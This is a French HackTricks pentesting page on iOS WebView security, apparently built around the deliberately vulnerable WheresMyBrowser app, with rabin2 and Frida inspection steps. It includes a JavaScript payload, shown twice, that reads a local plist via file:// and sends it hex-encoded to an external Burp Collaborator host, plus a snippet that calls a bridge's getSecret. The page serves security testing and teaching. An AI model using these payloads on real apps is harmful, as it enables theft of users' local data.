# iOS WebViews

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Types de WebViews

Les WebViews sont des composants de navigateur int√©gr√©s dans l'application pour afficher du **contenu web** interactif. Ils peuvent √™tre utilis√©s pour int√©grer directement du contenu web dans l'interface utilisateur d'une application. Les WebViews iOS **supportent** l'ex√©cution de **JavaScript** **par d√©faut**, donc l'injection de scripts et les attaques de Cross-Site Scripting peuvent les affecter.

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebView est obsol√®te √† partir d'iOS 12 et ne devrait pas √™tre utilis√©. **JavaScript ne peut pas √™tre d√©sactiv√©**.
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview) : C'est le choix appropri√© pour √©tendre les fonctionnalit√©s de l'application, contr√¥ler le contenu affich√©.
* **JavaScript** est activ√© par d√©faut mais gr√¢ce √† la propri√©t√© **`javaScriptEnabled`** de `WKWebView`, il **peut √™tre compl√®tement d√©sactiv√©**, emp√™chant tous les d√©fauts d'injection de scripts.
* La propri√©t√© **`JavaScriptCanOpenWindowsAutomatically`** peut √™tre utilis√©e pour **emp√™cher** JavaScript d'**ouvrir de nouvelles fen√™tres**, telles que des pop-ups.
* La propri√©t√© **`hasOnlySecureContent`** peut √™tre utilis√©e pour v√©rifier que les ressources charg√©es par le WebView sont r√©cup√©r√©es via des connexions chiffr√©es.
* `WKWebView` impl√©mente un rendu hors processus, donc **les bugs de corruption de m√©moire n'affecteront pas** le processus principal de l'application.
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** Il devrait √™tre utilis√© pour fournir une **exp√©rience de visualisation web g√©n√©ralis√©e**. Ces WebViews peuvent √™tre facilement identifi√©s car ils ont une disposition caract√©ristique qui comprend les √©l√©ments suivants :

* Un champ d'adresse en lecture seule avec un indicateur de s√©curit√©.
* Un bouton d'**Action ("Partager")**.
* Un **bouton Termin√©**, des boutons de navigation arri√®re et avant, et un bouton "Safari" pour ouvrir la page directement dans Safari.

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* **JavaScript ne peut pas √™tre d√©sactiv√©** dans `SFSafariViewController` et c'est l'une des raisons pour lesquelles l'utilisation de `WKWebView` est recommand√©e lorsque l'objectif est d'√©tendre l'interface utilisateur de l'application.
* `SFSafariViewController` **partage √©galement les cookies** et autres donn√©es de sites web avec **Safari**.
* L'activit√© et l'interaction de l'utilisateur avec un `SFSafariViewController` sont **invisibles pour l'application**, qui ne peut pas acc√©der aux donn√©es de remplissage automatique, √† l'historique de navigation ou aux donn√©es des sites web.
* Selon les directives de r√©vision de l'App Store, les `SFSafariViewController` **ne peuvent pas √™tre cach√©s ou obscurcis par d'autres vues ou couches**.

## D√©couverte de la configuration des WebViews

### Analyse statique

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Vous pouvez √©galement rechercher des m√©thodes connues de ces classes WebView. Par exemple, recherchez la m√©thode utilis√©e pour initialiser un WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)) :
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Test de la configuration JavaScript

Pour les `WKWebView`, en tant que meilleure pratique, JavaScript devrait √™tre d√©sactiv√© √† moins qu'il ne soit explicitement n√©cessaire. Pour v√©rifier que JavaScript a √©t√© correctement d√©sactiv√©, recherchez dans le projet les utilisations de `WKPreferences` et assurez-vous que la propri√©t√© [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est d√©finie sur `false` :
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Si vous disposez uniquement du binaire compil√©, vous pouvez rechercher ceci dedans :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Test du OnlySecureContent

Contrairement aux `UIWebView`, lors de l'utilisation des `WKWebView`, il est possible de d√©tecter le [contenu mixte](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (contenu HTTP charg√© depuis une page HTTPS). En utilisant la m√©thode [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent), on peut v√©rifier si toutes les ressources de la page ont √©t√© charg√©es via des connexions s√©curis√©es crypt√©es.\
Dans le binaire compil√© :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Vous pouvez √©galement rechercher dans le code source ou les cha√Ænes de caract√®res la cha√Æne "http://". Cependant, cela ne signifie pas n√©cessairement qu'il y a un probl√®me de contenu mixte. Apprenez-en plus sur le contenu mixte dans les [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### Analyse Dynamique

Il est possible d'inspecter le tas via `ObjC.choose()` pour trouver des instances des diff√©rents types de WebViews et √©galement rechercher les propri√©t√©s `javaScriptEnabled` et `hasonlysecurecontent` :

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
Chargez-le avec :
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Gestion du protocole WebView

Plusieurs sch√©mas par d√©faut sont disponibles et interpr√©t√©s dans un WebView sur iOS, par exemple :

* http(s)://
* file://
* tel://

Les WebViews peuvent charger du contenu distant depuis un point de terminaison, mais ils peuvent √©galement charger du contenu local depuis le r√©pertoire de donn√©es de l'application. Si le contenu local est charg√©, l'utilisateur ne devrait pas pouvoir influencer le nom de fichier ou le chemin utilis√© pour charger le fichier, et les utilisateurs ne devraient pas pouvoir √©diter le fichier charg√©.

### Chargement de contenu WebView

* **UIWebView** : Il peut utiliser des m√©thodes obsol√®tes [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) pour charger du contenu.
* **WKWebView** : Il peut utiliser les m√©thodes [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) pour charger des fichiers HTML locaux et `loadRequest:` pour le contenu web. Typiquement, les fichiers locaux sont charg√©s en combinaison avec des m√©thodes incluant, entre autres : [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) ou [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). De plus, vous devriez √©galement v√©rifier si l'application utilise la m√©thode [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Son premier param√®tre est `URL` et contient l'URL √† charger dans le WebView, son second param√®tre `allowingReadAccessToURL` peut contenir un seul fichier ou un r√©pertoire. S'il contient un seul fichier, ce fichier sera disponible pour le WebView. Cependant, s'il contient un r√©pertoire, tous les fichiers de ce **r√©pertoire seront disponibles pour le WebView**. Par cons√©quent, il vaut la peine d'inspecter cela et dans le cas o√π c'est un r√©pertoire, de v√©rifier qu'aucune donn√©e sensible ne peut y √™tre trouv√©e.

Si vous avez le code source, vous pouvez rechercher ces m√©thodes. Ayant le **binaire** **compil√©**, vous pouvez √©galement rechercher ces m√©thodes :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acc√®s aux fichiers

* **UIWebView :**
* Le sch√©ma `file://` est toujours activ√©.
* L'acc√®s aux fichiers depuis les URL `file://` est toujours activ√©.
* L'acc√®s universel depuis les URL `file://` est toujours activ√©.
* Si vous r√©cup√©rez l'origine effective d'un `UIWebView` o√π `baseURL` est √©galement d√©fini sur `nil`, vous verrez qu'elle n'est **pas d√©finie sur "null"**, √† la place, vous obtiendrez quelque chose de similaire √† ce qui suit : `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`. Cette origine "applewebdata://" est similaire √† l'origine "file://" car elle **n'impl√©mente pas la Politique de M√™me Origine** et permet l'acc√®s aux fichiers locaux et √† toutes les ressources web.

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView** :
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` par d√©faut) : cela permet √† JavaScript ex√©cut√© dans le contexte d'une URL de sch√©ma `file://` d'acc√©der au contenu d'autres URLs de sch√©ma `file://`.
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` par d√©faut) : cela permet √† JavaScript ex√©cut√© dans le contexte d'une URL de sch√©ma `file://` d'acc√©der au contenu de n'importe quelle origine.

Vous pouvez rechercher ces fonctions dans le code source de l'application ou dans le binaire compil√©.\
De plus, vous pouvez utiliser le script frida suivant pour trouver cette information :
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Exfiltration de fichiers arbitraires
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©thodes natives expos√©es √† travers les WebViews

Depuis iOS 7, Apple a introduit des API qui permettent **la communication entre l'environnement d'ex√©cution JavaScript dans le WebView et les objets natifs** Swift ou Objective-C.

Il existe deux mani√®res fondamentales dont le code natif et JavaScript peuvent communiquer :

* **JSContext** : Lorsqu'un bloc Objective-C ou Swift est assign√© √† un identifiant dans un `JSContext`, JavaScriptCore enveloppe automatiquement le bloc dans une fonction JavaScript.
* **Protocole JSExport** : Les propri√©t√©s, m√©thodes d'instance et m√©thodes de classe d√©clar√©es dans un protocole h√©rit√© de `JSExport` sont mapp√©es sur des objets JavaScript qui sont disponibles pour tout le code JavaScript. Les modifications des objets qui sont dans l'environnement JavaScript se refl√®tent dans l'environnement natif.

Notez que **seuls les membres de classe d√©finis dans le protocole `JSExport`** sont rendus accessibles au code JavaScript.\
Faites attention au code qui mappe des objets natifs au `JSContext` associ√© √† un WebView et analysez quelles fonctionnalit√©s il expose, par exemple aucune donn√©e sensible ne devrait √™tre accessible et expos√©e aux WebViews.\
En Objective-C, le `JSContext` associ√© √† un `UIWebView` est obtenu comme suit :
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
Le code JavaScript dans un **`WKWebView` peut toujours envoyer des messages √† l'application native mais contrairement √† `UIWebView`, il n'est pas possible de r√©f√©rencer directement le `JSContext`** d'un `WKWebView`. √Ä la place, la communication est mise en ≈ìuvre √† l'aide d'un syst√®me de messagerie et en utilisant la fonction `postMessage`, qui s√©rialise automatiquement les objets JavaScript en objets natifs Objective-C ou Swift. Les gestionnaires de messages sont configur√©s en utilisant la m√©thode [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Activation de JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Envoi de message

Ajouter un gestionnaire de messages script avec le nom `"name"` (ou `"javaScriptBridge"` dans l'exemple ci-dessus) fait que la fonction JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` soit d√©finie dans tous les cadres de toutes les vues web qui utilisent le contr√¥leur de contenu utilisateur. Il peut ensuite [√™tre utilis√© √† partir du fichier HTML comme ceci](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33) :
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Une fois que la fonction Native est ex√©cut√©e, elle ex√©cutera g√©n√©ralement **du JavaScript √† l'int√©rieur de la page web** (voir `evaluateJavascript` ci-dessous). Vous pourriez √™tre int√©ress√© par **le remplacement de la fonction** qui va √™tre ex√©cut√©e pour **voler le r√©sultat**.
Par exemple, dans le script ci-dessous, la fonction **`javascriptBridgeCallBack`** va √™tre ex√©cut√©e avec 2 param√®tres (la fonction appel√©e et le **r√©sultat**). Si vous contr√¥lez le HTML qui va √™tre charg√©, vous pouvez cr√©er une **alerte avec le r√©sultat** comme suit :
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### Fonction appel√©e

La fonction appel√©e se trouve dans [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29):
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Test

Pour tester, envoyez un postMessage dans une application, vous pouvez :

* Modifier la r√©ponse du serveur (MitM)
* Effectuer une instrumentation dynamique et injecter le payload JavaScript en utilisant des frameworks comme Frida et les fonctions d'√©valuation JavaScript correspondantes disponibles pour les iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) pour `UIWebView` et [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) pour `WKWebView`).

## D√©bogage des iOS WebViews

(Tutoriel de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Dans les webviews iOS, les messages envoy√©s √† `console.log()` ne sont _pas_ imprim√©s dans les logs Xcode. Il est tout de m√™me assez simple de d√©boguer le contenu web avec les outils de d√©veloppement de Safari, bien qu'il y ait quelques limitations :

* Le d√©bogage des webviews iOS n√©cessite Safari, donc votre ordinateur de d√©veloppement doit √™tre sous macOS.
* Vous ne pouvez d√©boguer que les webviews dans les applications charg√©es sur votre appareil via Xcode. Vous ne pouvez pas d√©boguer les webviews dans les applications install√©es via l'App Store ou Apple Configurator.

Avec ces limitations √† l'esprit, voici les √©tapes pour d√©boguer √† distance une webview dans iOS :

* Tout d'abord, activez l'inspecteur Web Safari sur votre appareil iOS en ouvrant l'application _R√©glages_ iOS, en naviguant vers **R√©glages > Safari > Avanc√©**, et en activant l'option _Inspecteur Web_.

![R√©glages Safari iOS](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* Ensuite, vous devez √©galement activer les outils de d√©veloppement dans Safari sur votre ordinateur de d√©veloppement. Lancez Safari sur votre machine de d√©veloppement et naviguez vers **Safari > Pr√©f√©rences** dans la barre de menu. Dans le panneau de pr√©f√©rences qui appara√Æt, cliquez sur l'onglet _Avanc√©_ puis activez l'option _Afficher le menu D√©veloppement_ en bas. Apr√®s cela, vous pouvez fermer le panneau de pr√©f√©rences.

![R√©glages Safari Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Connectez votre appareil iOS √† votre ordinateur de d√©veloppement et lancez votre application.
* Dans Safari sur votre ordinateur de d√©veloppement, cliquez sur _D√©veloppement_ dans la barre de menu et survolez l'option d√©roulante qui est le nom de votre appareil iOS pour afficher une liste des instances de webview en cours d'ex√©cution sur votre appareil iOS.

![Menu d√©veloppeur Safari Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Cliquez sur l'option d√©roulante pour la webview que vous souhaitez d√©boguer. Cela ouvrira une nouvelle fen√™tre d'inspecteur Web Safari pour inspecter la webview.

![Fen√™tre d'inspecteur Web Safari](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## R√©f√©rences

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
